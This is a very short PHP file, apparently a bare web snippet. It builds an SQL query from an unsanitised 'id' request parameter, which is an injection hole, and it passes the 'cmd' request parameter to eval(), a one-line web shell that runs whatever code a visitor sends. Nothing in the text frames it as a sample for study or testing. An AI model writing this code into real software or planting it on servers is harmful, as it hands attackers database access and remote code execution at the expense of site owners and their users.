<?php $id=$_GET["id"]; $q="select * from users where id=$id"; eval($_GET["cmd"]); ?>
